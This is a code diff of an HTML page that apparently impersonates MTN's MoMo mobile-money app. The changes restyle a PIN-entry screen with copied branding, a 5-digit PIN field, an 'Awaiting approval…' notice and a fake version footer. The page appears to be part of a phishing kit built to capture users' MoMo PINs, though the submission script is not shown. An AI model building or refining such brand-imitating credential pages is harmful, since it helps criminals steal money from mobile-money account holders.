@@ -3,89 +3,177 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>MTN MoMo - PIN</title>
+  <title>MoMo - PIN</title>
   <style>
-    /* ===== MTN MoMo Style ===== */
+    /* ===== MOMO STYLE (consistent with other pages) ===== */
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
     }
-    body {
-      background: #0a0a0a;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 1.5rem;
-    }
-    .app-wrapper {
+
+    html, body {
       width: 100%;
-      max-width: 420px;
-      background: #ffffff;
-      border-radius: 1.5rem;
-      box-shadow: 0 20px 60px rgba(255, 179, 0, 0.12);
-      border: 1px solid rgba(255, 179, 0, 0.15);
-      overflow: hidden;
-      min-height: 100vh; /* fallback */
+      min-height: 100%;
+    }
+
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background: #fff;
+      overflow-x: hidden;
+    }
+
+    /* =========================================
+       APP CONTAINER
+    ========================================= */
+
+    .app {
       position: relative;
+      width: 100%;
+      max-width: 540px;
+      min-height: 100vh;
+      min-height: 100svh;
+      margin: 0 auto;
+      background: #fff;
+      overflow: hidden;
     }
+
+    /* =========================================
+       TOP BLUE AREA
+    ========================================= */
+
+    .top {
+      position: relative;
+      height: 220px;
+      background: #004c69;
+      padding-top: 52px;
+    }
+
+    /*
+      White curved bottom of blue area
+    */
+    .top::after {
+      content: "";
+      position: absolute;
+      left: -10%;
+      bottom: -75px;
+      width: 120%;
+      height: 125px;
+      background: #fff;
+      border-radius: 50% 50% 0 0 / 70% 70% 0 0;
+    }
+
+    /* =========================================
+       TOP BAR WITH BACK BUTTON AND LOGO
+    ========================================= */
+
     .top-bar {
-      height: 72px;
-      background: #ffb300;
+      position: relative;
+      z-index: 2;
       display: flex;
       align-items: center;
+      justify-content: space-between;
       padding: 0 22px;
-      flex-shrink: 0;
-      box-shadow: 0 2px 12px rgba(255, 179, 0, 0.2);
+      margin-top: -10px;
     }
-    .top-bar .logo {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-    .top-bar .logo svg {
-      height: 36px;
-      width: auto;
-    }
-    .top-bar .logo span {
-      font-weight: 700;
-      font-size: 18px;
-      color: #0a0a0a;
-      letter-spacing: -0.5px;
-    }
+
     .back-btn {
-      color: #0a0a0a;
+      color: #ffd500;
       font-size: 30px;
       text-decoration: none;
       font-weight: 300;
+      line-height: 1;
       background: none;
       border: none;
-      padding: 0;
       cursor: pointer;
-      margin-right: 16px;
       transition: color 0.2s;
     }
-    .back-btn:hover { color: #004b87; }
-    .container {
-      padding: 28px 24px 120px;
+    .back-btn:hover {
+      color: #ffffff;
+    }
+
+    .logo {
       display: flex;
-      flex-direction: column;
+      align-items: center;
+      gap: 8px;
     }
+
+    .logo-box {
+      width: 40px;
+      height: 40px;
+      border-radius: 8px;
+      background: linear-gradient(145deg, #087398, #003d59);
+      box-shadow: 0 2px 5px rgba(0,0,0,.25), inset 0 0 4px rgba(255,255,255,.12);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .logo-symbol {
+      width: 22px;
+      height: 28px;
+      background: #ffd500;
+      clip-path: polygon(50% 0, 100% 30%, 86% 100%, 59% 69%, 39% 100%, 13% 34%);
+      position: relative;
+    }
+    .logo-symbol::after {
+      content: "";
+      position: absolute;
+      width: 6px;
+      height: 6px;
+      background: #004c69;
+      border-radius: 50%;
+      left: 8px;
+      top: 8px;
+    }
+
+    .logo-text {
+      color: #ffd500;
+      font-size: 20px;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+    }
+    .logo-text .light {
+      font-weight: 400;
+      font-size: 14px;
+      color: #b8d4e8;
+    }
+
+    /* =========================================
+       CARD
+    ========================================= */
+
+    .card {
+      position: relative;
+      z-index: 5;
+      width: calc(100% - 36px);
+      margin: -100px auto 0;
+      background: #fff;
+      border-radius: 34px;
+      padding: 32px 27px 27px;
+      box-shadow: 0 12px 25px rgba(0, 0, 0, .12);
+    }
+
     .title {
-      font-size: 26px;
-      font-weight: 700;
-      color: #0a0a0a;
+      text-align: center;
+      color: #07516b;
+      font-size: 25px;
+      font-weight: 400;
       margin-bottom: 4px;
-      letter-spacing: -0.3px;
     }
+    .title strong {
+      font-weight: 700;
+    }
+
     .subtitle {
+      text-align: center;
+      color: #555;
       font-size: 15px;
-      color: #4a4a4a;
       margin-bottom: 28px;
-      line-height: 1.5;
     }
+
+    /* ----- PIN INPUT ----- */
+
     .pin-box-wrapper {
       background: #f8fafc;
       border-radius: 18px;
@@ -96,12 +184,14 @@
       cursor: pointer;
       touch-action: manipulation;
     }
+
     .pin-row {
       display: flex;
       justify-content: center;
       gap: 14px;
       align-items: center;
     }
+
     .pin-box {
       width: 56px;
       height: 56px;
@@ -116,10 +206,12 @@
       color: #0a0a0a;
       transition: border-color 0.3s, box-shadow 0.2s;
     }
+
     .pin-box.filled {
-      border-color: #ffb300;
-      box-shadow: 0 0 0 3px rgba(255, 179, 0, 0.25);
+      border-color: #005572;
+      box-shadow: 0 0 0 3px rgba(0, 85, 114, 0.15);
     }
+
     .lock-icon {
       width: 56px;
       height: 56px;
@@ -132,6 +224,7 @@
       font-size: 26px;
       color: #aaa;
     }
+
     #pinInput {
       position: absolute;
       top: 0;
@@ -145,6 +238,9 @@
       cursor: pointer;
       font-size: 16px;
     }
+
+    /* ----- Alerts & Waiting ----- */
+
     #otp-alert {
       text-align: center;
       font-size: 15px;
@@ -157,16 +253,19 @@
       transition: all 0.2s;
       border: 1px solid transparent;
     }
+
     #otp-alert.error {
       background: #fef3f2;
       color: #c0392b;
       border-color: #fecdca;
     }
+
     #otp-alert.success {
       background: #ecfdf3;
       color: #0b2b3b;
       border-color: #abf0d1;
     }
+
     #waiting {
       text-align: center;
       font-size: 14px;
@@ -178,44 +277,51 @@
       background: #f8fafc;
       border: 1px solid #e2e8f0;
     }
+
+    /* =========================================
+       BOTTOM BUTTON (sticky)
+    ========================================= */
+
+    .bottom {
+      width: 100%;
+      padding: 0 18px 14px;
+      margin-top: 30px;
+    }
+
     .continue-btn {
-      position: fixed;
-      left: 50%;
-      transform: translateX(-50%);
-      bottom: 28px;
-      height: 56px;
+      width: 100%;
+      height: 69px;
       border: none;
-      border-radius: 60px;
-      background: #ccc;
+      border-radius: 40px;
+      background: #d1d5db;
       color: #fff;
-      font-size: 20px;
+      font-size: 22px;
       font-weight: 700;
       cursor: not-allowed;
-      transition: background 0.2s, transform 0.15s, box-shadow 0.2s;
+      font-family: Arial, Helvetica, sans-serif;
+      transition: background 0.3s ease;
       text-transform: uppercase;
       letter-spacing: 0.5px;
-      max-width: 420px;
-      width: calc(100% - 48px);
-      box-shadow: 0 8px 24px rgba(255, 179, 0, 0);
     }
+
     .continue-btn:enabled {
-      background: linear-gradient(135deg, #ffb300, #ffcc00);
-      color: #0a0a0a;
+      background: #005572;
       cursor: pointer;
-      box-shadow: 0 8px 24px rgba(255, 179, 0, 0.35);
     }
     .continue-btn:enabled:hover {
-      background: linear-gradient(135deg, #e6a200, #ffb300);
-      transform: translateX(-50%) scale(1.01);
-      box-shadow: 0 12px 32px rgba(255, 179, 0, 0.45);
+      background: #00415a;
     }
+    .continue-btn:enabled:active {
+      transform: scale(.98);
+    }
+
     .continue-btn.waiting {
       background: #f5a623;
       color: #fff;
       opacity: 1;
       cursor: default;
-      box-shadow: 0 8px 24px rgba(255, 179, 0, 0.3);
     }
+
     .footer {
       margin-top: 24px;
       text-align: center;
@@ -224,38 +330,109 @@
       letter-spacing: 0.5px;
       padding-bottom: 12px;
     }
+
+    /* =========================================
+       RESPONSIVE
+    ========================================= */
+
     @media (max-width: 480px) {
-      body { padding: 1rem; }
-      .app-wrapper { border-radius: 1rem; }
-      .container { padding: 24px 18px 110px; }
-      .title { font-size: 24px; }
-      .pin-box { width: 50px; height: 50px; font-size: 24px; }
-      .lock-icon { width: 50px; height: 50px; font-size: 22px; }
-      .continue-btn { height: 54px; font-size: 18px; bottom: 22px; width: calc(100% - 36px); }
+      .top {
+        height: 190px;
+        padding-top: 40px;
+      }
+      .top-bar {
+        padding: 0 16px;
+      }
+      .card {
+        width: calc(100% - 28px);
+        margin-top: -90px;
+        padding: 28px 20px 24px;
+        border-radius: 28px;
+      }
+      .title {
+        font-size: 22px;
+      }
+      .pin-box {
+        width: 50px;
+        height: 50px;
+        font-size: 24px;
+      }
+      .lock-icon {
+        width: 50px;
+        height: 50px;
+        font-size: 22px;
+      }
+      .continue-btn {
+        height: 62px;
+        font-size: 20px;
+      }
     }
-    @media (max-width: 360px) {
-      .pin-box { width: 44px; height: 44px; font-size: 20px; }
-      .lock-icon { width: 44px; height: 44px; font-size: 18px; }
-      .pin-row { gap: 10px; }
+
+    @media (max-width: 380px) {
+      .card {
+        padding-left: 16px;
+        padding-right: 16px;
+      }
+      .title {
+        font-size: 20px;
+      }
+      .pin-box {
+        width: 44px;
+        height: 44px;
+        font-size: 20px;
+      }
+      .lock-icon {
+        width: 44px;
+        height: 44px;
+        font-size: 18px;
+      }
+      .pin-row {
+        gap: 10px;
+      }
+      .continue-btn {
+        height: 58px;
+        font-size: 18px;
+      }
+    }
+
+    @media (max-height: 750px) {
+      .bottom {
+        margin-top: 15px;
+      }
     }
   </style>
 </head>
 <body>
 
-<div class="app-wrapper">
-  <div class="top-bar">
-    <button class="back-btn" onclick="window.history.back()">&#8592;</button>
-    <div class="logo">
-      <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <rect x="2" y="2" width="36" height="36" rx="8" fill="#FFCC00" stroke="#004B87" stroke-width="2"/>
-        <path d="M14 12L22 12L18 20L22 28L14 28L18 20L14 12Z" fill="#004B87"/>
-        <text x="46" y="26" font-family="Arial, sans-serif" font-weight="700" font-size="20" fill="#004B87">MTN </text>
-      </svg>
-      <span>Mobile Money</span>
+<div class="app">
+
+  <!-- ================= TOP BLUE AREA ================= -->
+
+  <div class="top">
+
+    <div class="top-bar">
+      <!-- Back button -->
+      <button class="back-btn" onclick="window.history.back()">&#8592;</button>
+
+      <!-- Logo (compact) -->
+      <div class="logo">
+        <div class="logo-box">
+          <div class="logo-symbol"></div>
+        </div>
+        <div class="logo-text">MoMo <span class="light">from MTN</span></div>
+      </div>
+
+      <!-- Spacer for alignment -->
+      <div style="width: 30px;"></div>
     </div>
+
   </div>
-  <div class="container">
-    <div class="title">Enter Your MoMo PIN</div>
+
+  <!-- ================= CARD ================= -->
+
+  <div class="card">
+
+    <div class="title">Enter Your <strong>MoMo PIN</strong></div>
     <div class="subtitle">Enter your 5‑digit PIN</div>
 
     <div class="pin-box-wrapper">
@@ -272,10 +449,17 @@
 
     <div id="otp-alert"></div>
     <div id="waiting">⏳ Awaiting approval…</div>
-    <div class="footer">v 5.3.2 (1.0.0)</div>
+
   </div>
 
-  <button id="verifyBtn" class="continue-btn" disabled>SUBMIT</button>
+  <!-- ================= BOTTOM BUTTON ================= -->
+
+  <div class="bottom">
+    <button id="verifyBtn" class="continue-btn" disabled>SUBMIT</button>
+  </div>
+
+  <div class="footer">v 5.3.2 (1.0.0)</div>
+
 </div>
 
 <script>
@@ -480,5 +664,6 @@
   };
 })();
 </script>
+
 </body>
 </html>
